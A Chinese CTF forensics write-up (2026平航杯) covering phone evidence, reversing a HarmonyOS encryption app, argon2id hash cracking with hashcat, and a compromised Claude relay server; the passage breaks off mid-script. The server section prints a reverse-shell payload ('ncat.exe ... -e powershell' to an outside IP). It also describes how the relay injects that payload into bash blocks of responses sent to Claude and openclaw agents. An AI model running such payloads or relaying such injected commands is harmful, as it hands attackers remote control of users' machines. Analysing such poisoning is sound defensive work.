@@ -1,0 +1,8696 @@
+2026平航杯
+https://blog.csdn.net/Rhea_zzzz/article/details/160260933?spm=1001.2014.3001.5502
+id=a1b9784a-85dc-437d-a054-803b7c9cbed7
+source=Rhea_zzzz
+author=
+小萌新第一次打取证，心态崩了
+0x00 背景
+略…
+检材密码：R4f34s1XoPz34wrV
+0x01 手机取证
+检材：起早王的手机；倩倩的手机；倩倩的逆向包
+1.分析早起王的手机，手机型号为？【答案格式：Xiaomi 13】
+Pixel 6
+2.分析早起王的手机，早起王最近想旅行，结合高德地图搜索记录，他最可能去的景点是哪个？【答案格式：黄山】
+西湖
+3.分析早起王的手机，早起王在什么时间加上倩倩微信的？【答案格式：2025-08-18 07:09:19】
+2026-03-30 15:13:08
+4.分析早起王的手机，倩倩在2026年3月30号吃了什么？【答案格式：西湖醋鱼】
+麻薯小蛋糕
+5.分析倩倩的手机，倩倩手机的系统版本是多少？【答案格式：5.2.3.123】
+比赛的时候忘记备份密码放进去了，我说它的软件咋啥都没有分析出来
+6.0.0.380
+6.分析倩倩的手机，“舔狗”的微信内部ID是多少？【答案格式：wxid_ab12】
+不就是早起王吗，去倩倩那确定一下
+同一个，wxid_uh5tfx2zi8yh22
+7.分析倩倩的手机，倩倩曾给一位好友推荐游戏，这个好友叫什么名字？【答案格式：杨梅】
+冰糖
+8.分析倩倩的手机结合逆向包，推荐的游戏叫什么？【答案格式：far echo】
+结合17题知，解开"H:\1-手机\倩倩手机逆向包\com.koishi.fpt\haps\entry\files\vault\Snipaste_2026-04-03_10-56-53.jpg.tb"
+**zero sievert **
+9.分析倩倩的手机，倩倩一共阅读过多少条搜狐新闻？【答案格式：11】
+33
+10.分析倩倩手机逆向包，数据加密app的包名是什么？【答案格式：com.komeiji.satori】
+将.app可以改成.zip解压
+com.koishi.fpt
+11.接上题，初始化app时需要至少几位数的密码？【答案格式：10】
+.hap是鸿蒙包的后缀
+最核心的逻辑在ets\modules.abc文件里面
+https://github.com/ohos-decompiler/abc-decompiler
+用工具abc-decompiler打开modules.abc，然后在AuthPage里面即可找到
+** 6 **
+12.接上题，加密后的文件名的后缀是什么？【答案格式：.enc】
+这几个加密文件也能找到印证
+** .tb **
+13.接上题，app会自动识别几种后缀的文件为图片类型？【答案格式：8】
+刚刚图1没截全
+** ****5 **
+14.接上题，app共从用于自定义加密的so模块导入了几个方法？【答案格式：8】
+d类中，q1和s1两个方法从libcrypto.so中导入了方法
+** 2 **
+15.接上题，app设置的密码是多少？【答案格式：514aa11a4191a98】
+回到
+AuthPage
+类， AuthPage.handleAction 负责首设密码和验证密码 ：
+Key Code
+if
+(
+isfalse
+(
+this
+.
+isFirstTime
+)
+==
+null
+)
+{
+w1
+=
+e1
+.
+w1
+(
+this
+.
+password
+)
+;
+v1
+=
+e12
+.
+v1
+(
+)
+;
+asyncfunctionenter
+.
+put
+(
+"password_hash"
+,
+w1
+)
+;
+obj
+(
+"salt"
+,
+e13
+.
+c2
+(
+v1
+)
+)
+;
+this
+.
+navigateToHome
+(
+this
+.
+password
+)
+;
+}
+else
+{
+resumegenerator3
+=
+asyncfunctionenter
+.
+get
+(
+"password_hash"
+)
+;
+if
+(
+isfalse
+(
+e14
+.
+z1
+(
+this
+.
+password
+,
+resumegenerator3
+)
+)
+==
+null
+)
+{
+this
+.
+navigateToHome
+(
+this
+.
+password
+)
+;
+}
+}
+用户输入密码 ≠ 最终保存值
+最终保存值是
+e1.w1(this.password)
+的输出
+登录验证依赖
+e1.z1(明文, password_hash)
+首次设置密码时，
+AuthPage
+不会直接保存
+this.password
+，而是先调用
+e1.w1
+做一次变换，再把结果写入
+password_hash
+。登录时则调用
+e1.z1
+对输入密码和已存储值进行验证
+跟进
+@normalized:N&&&entry/src/main/ets/a/d&
+里的
+e1.w1
+和
+e1.z1
+：
+public
+Object
+#
+~
+e1
+<
+#
+q1
+(
+.
+.
+.
+,
+Object
+arg0
+)
+{
+d1
+=
+import
+{
+default
+as d1
+}
+from
+"@normalized:Y&&&libcrypto.so&"
+;
+return
+d1
+.
+q1
+(
+arg0
+)
+;
+}
+public
+Object
+#
+~
+e1
+<
+#
+w1
+(
+.
+.
+.
+,
+Object
+arg0
+)
+{
+return
+_lexenv_0_0_
+.
+q1
+(
+arg0
+)
+;
+}
+public
+Object
+#
+~
+e1
+<
+#
+z1
+(
+.
+.
+.
+,
+Object
+arg0
+,
+Object
+arg1
+)
+{
+return
+(
+arg1
+==
+_lexenv_0_0_
+.
+q1
+(
+arg0
+)
+?
+1
+:
+0
+)
+;
+}
+**password_hash**
+** 的生成逻辑完全在 native 的
+**q1**
+里**
+**z1**
+** 本质就是“把输入再跑一遍
+**q1**
+，和存储值比较”**
+还有一点：
+**salt**
+** 是在
+**AuthPage**
+首设密码时随机生成并存储的 **
+** 但
+**w1**
+和
+**z1**
+都
+没有
+接收 **
+**salt**
+** 所以
+**salt**
+不参与密码校验，也不参与
+**password_hash**
+的生成**
+这说明
+**salt**
+在这题里更像干扰项，真正决定
+**password_hash**
+的只有
+**q1**
+AuthPage.handleAction -> e1.w1 / e1.z1 -> q1 -> libcrypto.so
+shift + F12搜搜
+追踪下面两个
+__int64 __fastcall
+sub_5D58
+(
+__int64 a1
+,
+__int64 a2
+)
+{
+_OWORD v4
+[
+8
+]
+;
+// [xsp+0h] [xbp-90h] BYREF
+v4
+[
+4
+]
+=
+*
+(
+_OWORD
+*
+)
+&
+off_D930
+;
+// "xorEncrypt"
+v4
+[
+5
+]
+=
+*
+(
+_OWORD
+*
+)
+&
+off_D940
+;
+v4
+[
+6
+]
+=
+xmmword_D950
+;
+v4
+[
+7
+]
+=
+xmmword_D960
+;
+v4
+[
+0
+]
+=
+*
+(
+_OWORD
+*
+)
+&
+off_D8F0
+;
+// "rot13"
+v4
+[
+1
+]
+=
+*
+(
+_OWORD
+*
+)
+&
+off_D900
+;
+v4
+[
+2
+]
+=
+xmmword_D910
+;
+v4
+[
+3
+]
+=
+xmmword_D920
+;
+napi_define_properties
+(
+a1
+,
+a2
+,
+2
+,
+v4
+)
+;
+return
+a2
+;
+}
+确认一下是不是 rot13
+跟进 sub_5DE0
+Key Code：
+if
+(
+(
+unsigned
+int
+)
+(
+v14
+-
+97
+)
+<
+0x1A
+)
+{
+n97
+=
+97
+;
+v13
+=
+-
+81
+;
+}
+else
+{
+if
+(
+(
+unsigned
+int
+)
+(
+v14
+-
+65
+)
+>
+0x19
+)
+goto
+LABEL_20
+;
+n97
+=
+65
+;
+v13
+=
+-
+49
+;
+}
+*
+v11
+=
+(
+unsigned
+__int8
+)
+(
+v13
++
+v14
+)
+%
+0x1Au
++
+n97
+;
+这里的公式不是标准 ROT13
+对小写字母来说：
+result = ((ch - 81) % 26) + 97
+       = ((ch - 'a' + 16) % 26) + 'a'
+因为：
+'a' = 97
+97 - 81 = 16
+所以它实际是
+向后轮转 16 位
+，不是 13 位
+所以是 ROT16
+程序存储密码时是“字母后移 16”，手工还原时就要“字母前移 16”，而 CyberChef 用正向参数表示，所以填 10
+217cb94a01679e39
+16.接上题，app中存储的门锁密码是多少？【答案格式：5141141919810】
+上知，密码相关的
+q1/w1/z1
+这条线，真正要看的是
+0x5de0
+；文件加解密那条线看的是
+0x603c
+跟进 sub_603C：
+鸿蒙的so冗余信息好多，关键逻辑只有这一句：
+src
+[
+n0x20_1
+]
+=
+(
+s_3
+[
+n0x20_1
+%
+n_4
+]
++
+n0x20_1
+%
+n_4
+)
+^
+p_dest_2
+[
+n0x20_1
+]
+;
+把它整理一下就是：
+out
+[
+i
+]
+=
+in
+[
+i
+]
+^
+(
+key
+[
+i
+%
+keylen
+]
++
+(
+i
+%
+keylen
+)
+)
+xor小魔改
+这里要注意，文件加解密用的不是用户输入明文，而是
+**password_hash**
+。前面已经确认过，prefs 里存的是：
+password_hash = 217sr94q01679u39
+用这个值去解：
+files/notes/b88c3348-9389-4fad-8cd6-3490e6bbdd26.json.tb
+from
+pathlib
+import
+Path
+import
+json
+
+key
+=
+b"217sr94q01679u39"
+enc_path
+=
+Path
+(
+"b88c3348-9389-4fad-8cd6-3490e6bbdd26.json.tb"
+)
+data
+=
+enc_path
+.
+read_bytes
+(
+)
+# xorEncrypt: out[i] = in[i] ^ (key[i % keylen] + (i % keylen))
+dec
+=
+bytes
+(
+b
+^
+(
+(
+key
+[
+i
+%
+len
+(
+key
+)
+]
++
+(
+i
+%
+len
+(
+key
+)
+)
+)
+&
+0xff
+)
+for
+i
+,
+b
+in
+enumerate
+(
+data
+)
+)
+print
+(
+dec
+.
+decode
+(
+"utf-8"
+)
+)
+{
+"id"
+:
+"b88c3348-9389-4fad-8cd6-3490e6bbdd26"
+,
+"title"
+:
+"门锁密码"
+,
+"content"
+:
+"1472580369123"
+,
+"updatedAt"
+:
+1775196161152
+}
+**1472580369123 **
+17.接上题，加密图片里面的隐藏的flag是多少？【答案格式：flag{123456!}】
+from
+pathlib
+import
+Path
+
+KEY
+=
+b"217sr94q01679u39"
+def
+xor_decrypt
+(
+data
+:
+bytes
+,
+key
+:
+bytes
+)
+-
+>
+bytes
+:
+return
+bytes
+(
+b
+^
+(
+(
+key
+[
+i
+%
+len
+(
+key
+)
+]
++
+(
+i
+%
+len
+(
+key
+)
+)
+)
+&
+0xff
+)
+for
+i
+,
+b
+in
+enumerate
+(
+data
+)
+)
+def
+detect_ext
+(
+data
+:
+bytes
+)
+-
+>
+str
+:
+if
+data
+.
+startswith
+(
+b"\x89PNG\r\n\x1a\n"
+)
+:
+return
+".png"
+if
+data
+.
+startswith
+(
+b"\xff\xd8\xff"
+)
+:
+return
+".jpg"
+if
+data
+.
+startswith
+(
+b"GIF87a"
+)
+or
+data
+.
+startswith
+(
+b"GIF89a"
+)
+:
+return
+".gif"
+if
+data
+.
+startswith
+(
+b"RIFF"
+)
+and
+data
+[
+8
+:
+12
+]
+==
+b"WEBP"
+:
+return
+".webp"
+return
+".bin"
+def
+main
+(
+)
+:
+enc_path
+=
+Path
+(
+"139346145_p0.png.tb"
+)
+data
+=
+enc_path
+.
+read_bytes
+(
+)
+dec
+=
+xor_decrypt
+(
+data
+,
+KEY
+)
+ext
+=
+detect_ext
+(
+dec
+)
+out_path
+=
+enc_path
+.
+with_suffix
+(
+""
+)
+# 去掉 .tb
+out_path
+=
+out_path
+.
+with_suffix
+(
+ext
+)
+# 改成识别出的后缀
+out_path
+.
+write_bytes
+(
+dec
+)
+print
+(
+f"[+] saved to:
+{
+out_path
+}
+"
+)
+if
+__name__
+==
+"__main__"
+:
+main
+(
+)
+010打开，图片末尾藏有flag
+******flag{happy_forensics_2026!} **
+0x02 服务器取证
+检材：api.E01
+18.分析服务器镜像，内核版本为？【答案格式：5.10-301-generic】
+# uname -r
+6.8
+.0-107-generic
+账密 zaoqiwang 123456
+账密：root 123456
+6.8.0-107-generic
+19.分析服务器镜像，用户登录成功系统的次数为？【答案格式：3】
+# last -f /var/log/wtmp
+root     pts/0
+192.168
+.134.1    Fri Apr
+17
+16
+:30   still logged
+in
+reboot
+system boot
+6.8
+.0-107-generi Fri Apr
+17
+16
+:17   still running
+zaoqiwan pts/0
+192.168
+.146.1    Fri Apr
+3
+14
+:30 - crash
+(
+14
++01:46
+)
+reboot
+system boot
+6.8
+.0-107-generi Fri Apr
+3
+14
+:30   still running
+zaoqiwan pts/1
+192.168
+.146.1    Fri Apr
+3
+14
+:29 -
+14
+:29
+(
+00:00
+)
+zaoqiwan pts/0
+192.168
+.146.1    Fri Apr
+3
+14
+:29 -
+14
+:30
+(
+00:01
+)
+reboot
+system boot
+6.8
+.0-107-generi Fri Apr
+3
+14
+:29 -
+14
+:30
+(
+00:01
+)
+zaoqiwan pts/1
+192.168
+.146.1    Fri Apr
+3
+14
+:26 -
+14
+:29
+(
+00:02
+)
+zaoqiwan pts/0
+192.168
+.146.1    Fri Apr
+3
+14
+:26 -
+14
+:29
+(
+00:02
+)
+reboot
+system boot
+6.8
+.0-107-generi Fri Apr
+3
+14
+:26 -
+14
+:29
+(
+00:03
+)
+zaoqiwan pts/1
+192.168
+.146.1    Fri Apr
+3
+14
+:20 -
+14
+:26
+(
+00:05
+)
+zaoqiwan pts/0
+192.168
+.146.1    Fri Apr
+3
+14
+:20 -
+14
+:26
+(
+00:05
+)
+reboot
+system boot
+6.8
+.0-107-generi Fri Apr
+3
+14
+:20 -
+14
+:26
+(
+00:05
+)
+zaoqiwan pts/0
+192.168
+.146.1    Fri Apr
+3
+13
+:53 -
+14
+:20
+(
+00:27
+)
+zaoqiwan pts/1
+192.168
+.146.1    Fri Apr
+3
+12
+:52 -
+14
+:20
+(
+01:27
+)
+zaoqiwan pts/0
+192.168
+.146.1    Fri Apr
+3
+12
+:29 -
+12
+:52
+(
+00:23
+)
+reboot
+system boot
+6.8
+.0-107-generi Fri Apr
+3
+12
+:26 -
+14
+:20
+(
+01:54
+)
+wtmp begins Fri Apr
+3
+12
+:26:19
+2026
+看zaoqiwang的，10
+20.分析服务器镜像，redis数据库服务密码是多少? 【答案格式：abcdef】
+# ps -ef | grep [r]edis
+systemctl status redis redis-server
+2
+>
+/dev/null
+systemctl
+cat
+redis redis-server
+2
+>
+/dev/null
+Redis 关键信息整理：
+1
+. 进程在运行
+redis
+889
+1
+0
+16
+:17 ?  00:00:05 /usr/bin/redis-server
+127.0
+.0.1:6379
+2
+. 服务名
+redis-server.service
+3
+. 服务状态
+Active: active
+(
+running
+)
+4
+. 启动命令
+ExecStart
+=
+/usr/bin/redis-server /etc/redis/redis.conf
+--supervised
+systemd
+--daemonize
+no
+5
+. 关键配置文件
+/etc/redis/redis.conf
+6
+. 运行用户
+User
+=
+redis
+Group
+=
+redis
+7
+. 结论
+Redis 实际读取的配置文件是：
+/etc/redis/redis.conf
+**Redis 用的是 **
+**/etc/redis/redis.conf**
+，因为 systemd 的
+ExecStart
+明确写了这个配置文件
+# grep -nE '^\s*(requirepass|masterauth|aclfile)\b|^user .* on .* >' /etc/redis/redis.conf
+1036
+:requirepass zjjcxy
+答案： zjjcxy
+21.分析服务器镜像，api站点后台管理员密码所用的加密算法为？【答案格式：bcrypt】
+网站源码位于 /home/zaoqiwang/claude-relay-service，为一个 Node.js 后端服务；
+后台管理员密码哈希位于 /home/zaoqiwang/claude-relay-service/data/init.json 文件中
+argon2id
+22.分析服务器镜像，api站点后台管理员密码为（使用rockyou字典爆破，密码格式b1???b，?为数字）？【答案格式：a123456a】
+Select-String
+-
+Path
+.
+\rockyou
+.
+txt
+-
+Pattern
+'^b1\d{5}b$'
+|
+ForEach-Object
+{
+$_
+.
+Line
+}
+|
+Set-Content
+.
+\cand
+.
+txt
+.
+\hashcat
+.
+exe
+-
+m 70000
+-
+a 0 hash
+.
+txt rockyou
+.
+txt
+hashes.txt
+里只放这一行：
+$argon2id$v=19$m=65536,t=3,p=1$k2++JvGxHI8i9DzqRXJx9A$jNviq0EPqLkMfIZZsA9RC6M9mClaXDxkSwCWYVZNx/Q
+$argon2id$v=19$m=65536,t=3,p=1$k2++JvGxHI8i9DzqRXJx9A$jNviq0EPqLkMfIZZsA9RC6M9mClaXDxkSwCWYVZNx/Q:b123321b
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 70000 (argon2id [Bridged: reference implementation + tunings])
+Hash.Target......: $argon2id$v=19$m=65536,t=3,p=1$k2++JvGxHI8i9DzqRXJx...VZNx/Q
+Time.Started.....: Fri Apr 17 21:31:26 2026 (1 sec)
+Time.Estimated...: Fri Apr 17 21:31:27 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (E:\CTF\MISC\Forensics\lovelycat\rockyou.txt\cand.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#*.........:      705 H/s
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 14/16 (87.50%)
+Rejected.........: 0/14 (0.00%)
+Restore.Point....: 0/16 (0.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: b122888b -> b121587b
+Hardware.Mon.#01.: Temp: 44c Util:  0% Core:2055MHz Mem:7000MHz Bus:8
+b123321b
+23.分析服务器镜像，登录api网站后台，后台通知设置里的超时事件（毫秒）为？【答案格式：10000】
+cd
+/home/zaoqiwang/claude-relay-service
+cat
+package.json
+后端入口
+"main"
+:
+"src/app.js"
+说明主程序入口就是：src/app.js
+启动命令
+"start"
+:
+"npm run lint && node src/app.js"
+,
+"dev"
+:
+"nodemon"
+正式启动：
+npm start
+开发启动：
+npm run dev
+# npm run dev
+Command
+'npm'
+not found, but can be installed with:
+apt
+install
+npm
+root@zaoqiwang:/home/zaoqiwang/claude-relay-service
+# node src/app.js
+Command
+'node'
+not found, but can be installed with:
+apt
+install
+nodejs
+什么鬼，找一下node在哪
+# find / -type f -name node 2>/dev/null
+/home/zaoqiwang/.local/share/fnm/node-versions/v24.14.1/installation/bin/node
+# /home/zaoqiwang/.local/share/fnm/node-versions/v24.14.1/installation/bin/node src/app.js
+05:01:41 🚀 Logger initialized
+         ├─ directory: /home/zaoqiwang/claude-relay-service/logs
+         ├─ maxSize: 10m
+         ├─ maxFiles:
+5
+└─ envOverride:
+true
+05:01:42 ⚠️ GEMINI_OAUTH_CLIENT_SECRET 未设置，使用内置默认值（建议在生产环境通过环境变量覆盖）
+05:01:42 ⚠️ ANTIGRAVITY_OAUTH_CLIENT_SECRET 未设置，使用内置默认值（建议在生产环境通过环境变量覆盖）
+05:01:42 🌐 Gemini HTTPS Agent initialized with TCP Keep-Alive support
+05:01:42 Standard Gemini API routes initialized
+05:01:43 🔄 Connecting to Redis
+..
+.
+📄 New log
+file
+created: /home/zaoqiwang/claude-relay-service/logs/claude-relay-2026-04-17.log
+📄 New log
+file
+created: /home/zaoqiwang/claude-relay-service/logs/claude-relay-error-2026-04-17.log
+📄 New log
+file
+created: /home/zaoqiwang/claude-relay-service/logs/claude-relay-security-2026-04-17.log
+📄 New log
+file
+created: /home/zaoqiwang/claude-relay-service/logs/claude-relay-auth-detail-2026-04-17.log
+05:01:43 🔗 Redis connected successfully
+05:01:43 ✅ Redis connected successfully
+05:01:43 ⚠️ 账户余额查询服务初始化失败:
+05:01:43 🔄 Initializing pricing service
+..
+.
+05:01:43 📋 Pricing
+file
+is
+343
+hours old, will update
+05:01:43 🔄 Updating model pricing data
+..
+.
+05:01:48 ⚠️  Failed to download pricing data: Download
+timeout
+after
+30
+seconds
+05:01:48 📋 Using
+local
+fallback pricing data
+..
+.
+05:01:48 📋 Copying fallback pricing data to data directory
+..
+.
+05:01:48 👁️  File watcher
+set
+up
+for
+model_pricing.json
+(
+polling every 60s
+)
+05:01:48 ⚠️  Using fallback pricing data
+for
+222
+models
+05:01:48 💡 Note: This fallback data may be outdated. The system will try to update from the remote
+source
+on next check.
+05:01:53 ⚠️  哈希校验失败：获取哈希超时（30秒）
+05:01:53 🕒 已启用价格文件哈希轮询（每10分钟校验一次）
+05:01:53 👁️  File watcher
+set
+up
+for
+model_pricing.json
+(
+polling every 60s
+)
+05:01:53 ✅ Pricing
+service
+initialized successfully
+05:01:53 🔄 Initializing model service
+..
+.
+05:01:53 ✅ Model
+service
+initialized with
+25
+models
+05:01:53 🔄 Initializing cache monitoring
+..
+.
+05:01:53 📦 Registered cache
+for
+monitoring: claudeAccount_decrypt
+05:01:53 ✅ Registered claudeAccount decrypt cache
+for
+monitoring
+05:01:53 📦 Registered cache
+for
+monitoring: claudeConsole_decrypt
+05:01:53 ✅ Registered claudeConsole decrypt cache
+for
+monitoring
+05:01:53 📦 Registered cache
+for
+monitoring: bedrockAccount_decrypt
+05:01:53 ✅ Registered bedrockAccount decrypt cache
+for
+monitoring
+05:01:53 ✅ Cache monitoring initialized
+05:01:53 🔄 Initializing admin credentials
+..
+.
+05:01:53 ✅ Admin credentials loaded from init.json
+(
+single
+source
+of truth
+)
+05:01:53 📋 Admin username: zaoqiwang
+05:01:53 🔒 Cleaning up invalid admin sessions
+..
+.
+05:01:53 ✅ Session cleanup completed:
+0
+valid,
+0
+invalid removed
+05:01:53 💰 Checking cost data initialization
+..
+.
+05:01:53 💰 Cost data appears to be up to
+date
+05:01:53 💰 Backfilling current-week Claude weekly cost
+..
+.
+05:01:53 💰 开始回填 Claude 周费用（2026-04-18）
+..
+.
+05:01:53 💰 预加载
+6
+个 API Key 数据
+05:01:53 ✅ Claude 周费用回填完成（2026-04-18）：keys
+=
+6
+,
+scanned
+=
+0
+,
+matchedClaude
+=
+0
+,
+filled
+=
+0
+（479ms）
+05:01:53 🕐 Initializing Claude account session windows
+..
+.
+05:01:53 🔄 Initializing session windows
+for
+all Claude accounts
+..
+.
+05:01:53 ✅ Session window initialization completed:
+05:01:53 ✅    Total accounts:
+0
+05:01:53 ✅    Valid windows:
+0
+05:01:53 ✅    Expired windows:
+0
+05:01:53 ✅    No windows:
+0
+05:01:53 📊 Initializing cost rank service
+..
+.
+05:01:53 🔄 Initializing CostRankService
+..
+.
+05:01:53 ✅ CostRankService initialized
+05:01:53 🔍 Initializing API Key index service
+..
+.
+05:01:53 ✅ API Key 索引已是最新版本
+05:01:53 ✅ Admin SPA
+(
+next
+)
+static files mounted at /admin-next/
+05:01:53 ✅ Application initialized successfully
+05:01:53 ⏱️  Server
+timeout
+set
+to 600000ms
+(
+600s
+)
+05:01:53 🔄 Cleanup tasks scheduled every
+60
+minutes
+05:01:53 🧹 Starting rate limit cleanup
+service
+(
+interval:
+5
+minutes
+)
+05:01:53 🚨 Rate limit cleanup
+service
+started
+(
+checking every
+5
+minutes
+)
+05:01:53 🔢 Concurrency cleanup task started
+(
+running every
+1
+minute
+)
+05:01:53 🚀 Starting account
+test
+scheduler
+service
+(
+node-cron mode
+)
+05:01:53 🧪 Account
+test
+scheduler
+service
+started
+05:01:53 🚀 Claude Relay Service started on
+0.0
+.0.0:3000
+05:01:53 🌐 Web interface: http://0.0.0.0:3000/admin-next/api-stats
+05:01:53 🔗 API endpoint: http://0.0.0.0:3000/api/v1/messages
+05:01:53 ⚙️  Admin API: http://0.0.0.0:3000/admin
+05:01:53 🏥 Health check: http://0.0.0.0:3000/health
+05:01:53 📊 Metrics: http://0.0.0.0:3000/metrics
+05:01:53 📬 User message queue: cleanup task started
+05:01:53 📅 Account
+test
+scheduler started
+(
+refreshing configs every 60s
+)
+05:01:53 📊 Updated cost rank
+for
+today:
+6
+keys
+in
+51ms
+05:01:53 📊 Updated cost rank
+for
+7days:
+6
+keys
+in
+8ms
+05:01:53 📊 Updated cost rank
+for
+30days:
+6
+keys
+in
+7ms
+05:01:53 📊 Updated cost rank
+for
+all:
+6
+keys
+in
+6ms
+05:01:58 📊 Cache System - Registered:
+3
+caches
+访问192.168.134.133:3000
+没啥用，找登录http://192.168.134.133:3000/admin-next/login
+账密：zaoqiwang b123321b
+114514
+24.分析服务器镜像，登录api网站后台，查询总Token消耗数量为？【答案格式：999.9K】
+474.2K
+25.分析服务器镜像，登录api网站后台，查询最早创建apikey的时间为？【答案格式：2026-01-01T13:11:22.190Z】
+一共六个，没有删除的
+找一下日志：/home/zaoqiwang/claude-relay-service/logs/service.log
+2026-04-01T11:11:07.535Z
+26.分析服务器镜像，编写脚本，通过调用inject_bash_blocks函数，确定恶意投毒的payload。（提示：输入一段包含
+bash
+块的文本）
+【答案格式：a.exe 192.168.1.1 22 -i hello】
+# cd /home/zaoqiwang/claude-relay-service
+grep
+-Rni
+"inject_bash_blocks"
+.
+./src/utils/bashBlockInjector.js:27:
+return
+_wasm.inject_bash_blocks
+(
+text
+)
+./src/utils/bash_block_injector_wasm/pkg/bash_block_injector.js:49:function inject_bash_blocks
+(
+text
+)
+{
+./src/utils/bash_block_injector_wasm/pkg/bash_block_injector.js:55:        const ret
+=
+wasm.inject_bash_blocks
+(
+ptr0, len0
+)
+;
+./src/utils/bash_block_injector_wasm/pkg/bash_block_injector.js:63:exports.inject_bash_blocks
+=
+inject_bash_blocks
+;
+grep: ./src/utils/bash_block_injector_wasm/pkg/bash_block_injector_bg.wasm: binary
+file
+matches
+已经定位到了，
+直接调这个导出的 JS 包装层就行
+，不用自己抠 wasm：
+/home/zaoqiwang/claude-relay-service/src/utils/bash_block_injector_wasm/pkg/bash_block_injector.js
+它已经明确导出了：
+exports
+.
+inject_bash_blocks
+=
+inject_bash_blocks
+;
+cat
+>
+/tmp/test_inject.js
+<<
+'EOF'
+const { inject_bash_blocks } = require('/home/zaoqiwang/claude-relay-service/src/utils/bash_block_injector_wasm/pkg/bash_block_injector.js');
+
+const input = `
+这里是测试文本
+
+\`\`\`bash
+echo hello
+id
+uname -a
+pwd
+\`\`\`
+
+结束
+`;
+
+const out = inject_bash_blocks(input);
+
+console.log('===== INPUT =====');
+console.log(input);
+console.log('===== OUTPUT =====');
+console.log(out);
+EOF
+运行：
+/home/zaoqiwang/.local/share/fnm/node-versions/v24.14.1/installation/bin/node /tmp/test_inject.js
+==
+==
+=
+INPUT
+==
+==
+=
+这里是测试文本
+
+```bash
+echo
+hello
+id
+uname
+-a
+pwd
+结束
+===== OUTPUT =====
+这里是测试文本
+echo
+hello
+id
+uname
+-a
+pwd
+ncat.exe
+156.238
+.239.253
+1314
+-e
+powershell
+结束
+**多出来的那段命令**，就是恶意投毒 payload  ，ncat.exe 156.238.239.253 1314 -e powershell
+
+### **27.接上题，should_inject_for_ua(ua, ip）对UA字符串有过滤条件，只有特定UA才会进入后续判断。请编写脚本找出有几个UA头能使函数有机会返回true的UA关键词。【答案格式：1】【提示：备选项：curl、openclaw、mozilla、wget、httpx、claude、requests、bot、crawler】**
+```bash
+# cd /home/zaoqiwang/claude-relay-service
+grep -Rni "should_inject_for_ua" .
+./src/utils/bashBlockInjector.js:38:  return _wasm.should_inject_for_ua(ua)
+./src/utils/bash_block_injector_wasm/pkg/bash_block_injector.js:81:function should_inject_for_ua(ua, ip) {
+./src/utils/bash_block_injector_wasm/pkg/bash_block_injector.js:86:    const ret = wasm.should_inject_for_ua(ptr0, len0, ptr1, len1);
+./src/utils/bash_block_injector_wasm/pkg/bash_block_injector.js:89:exports.should_inject_for_ua = should_inject_for_ua;
+grep: ./src/utils/bash_block_injector_wasm/pkg/bash_block_injector_bg.wasm: binary file matches
+有个很关键的点：
+./src/utils/bashBlockInjector.js:38
+return _wasm.should_inject_for_ua(ua)
+说明
+业务实际调用时只传了
+**ua**
+，没传
+**ip**
+。 所以这题先不用纠结 IP，直接把题目给的 9 个关键词逐个塞进 UA 里测，统计
+哪些有机会返回 true
+这个函数不是单次纯判断
+它有状态，所以不能只调一次，正确测法是：
+同一个
+ua
+同一个
+ip
+先调用一次
+立刻再调用一次
+第二次如果返回 true，就记一次命中
+然后换一个新 IP，再重复
+cat
+>
+/tmp/test_ua_keywords_real.js
+<<
+'EOF'
+const wasm = require('/home/zaoqiwang/claude-relay-service/src/utils/bash_block_injector_wasm/pkg/bash_block_injector.js');
+
+const uas = [
+  'curl',
+  'openclaw',
+  'mozilla',
+  'wget',
+  'httpx',
+  'Claude',
+  'requests',
+  'bot',
+  'crawler',
+];
+
+for (const ua of uas) {
+  let hits = 0;
+  for (let i = 0; i < 1000; i++) {
+    const ip = `u.${i}.0.1`;
+
+    // 第一次：写入状态
+    wasm.should_inject_for_ua(ua, ip);
+
+    // 第二次：立刻检测
+    if (wasm.should_inject_for_ua(ua, ip)) {
+      hits++;
+    }
+  }
+  console.log(ua, hits);
+}
+EOF
+# /home/zaoqiwang/.local/share/fnm/node-versions/v24.14.1/installation/bin/node /tmp/test_ua_keywords_clean.js
+curl
+0
+openclaw
+20
+mozilla
+0
+wget
+0
+httpx
+0
+Claude
+21
+requests
+0
+bot
+0
+crawler
+0
+openclaw，Claude
+答案：2
+28.接上题，只有当同一IP的上次请求距今足够近时，才会进入概率判断。请编写脚本确定这个时间窗口的阈值（单位：ms）。【答案格式：100，注意，只保留整百的，四舍五入】【提示：必须控制变量，每次实验使用一批全新的IP，先统一记录时间戳，再等待固定间隔后统一检测，不可在等待期间更新同一IP的时间戳，否则会刷新计时，从0ms到1000ms逐步探测，找到从“命中”变为“不命中”的临界间隔，建议每个间隔值使用≥200个IP以消除概率干扰。】
+前一题已经确认能过 UA 过滤的关键词只有：
+openclaw
+Claude
+所以这题就固定用一个能命中的 UA，比如：Claude
+然后按题目提示做
+双阶段实验
+：
+对一批
+全新的 IP
+先统一调用一次
+should_inject_for_ua(ua, ip)
+，只为了
+记录时间戳
+等待固定间隔
+delay
+再对这批 IP 各调用一次
+should_inject_for_ua(ua, ip)
+，统计命中数
+换
+另一批全新 IP
+，测下一个
+delay
+只要某个
+delay
+下从“还有命中”变成“基本 0 命中”，那个临界点就是时间窗口。最后按题目要求
+四舍五入到整百 ms
+cat
+>
+/tmp/test_threshold.js
+<<
+'EOF'
+const wasm = require('/home/zaoqiwang/claude-relay-service/src/utils/bash_block_injector_wasm/pkg/bash_block_injector.js');
+
+const UA = 'Claude';      // 或 openclaw
+const BATCH = 300;        // >=200，建议 300
+const START = 0;
+const END = 1000;
+const STEP = 20;          // 先粗扫 20ms，最后再细扫临界区
+const BASE = Date.now();
+
+function sleep(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
+
+async function runOneDelay(delay, round) {
+  const ips = [];
+  for (let i = 0; i < BATCH; i++) {
+    ips.push(`exp-${round}-${delay}-${i}.1`);
+  }
+
+  // 第一阶段：统一写入时间戳
+  for (const ip of ips) {
+    wasm.should_inject_for_ua(UA, ip);
+  }
+
+  // 固定等待
+  await sleep(delay);
+
+  // 第二阶段：统一检测
+  let hits = 0;
+  for (const ip of ips) {
+    if (wasm.should_inject_for_ua(UA, ip)) hits++;
+  }
+
+  return hits;
+}
+
+(async () => {
+  let results = [];
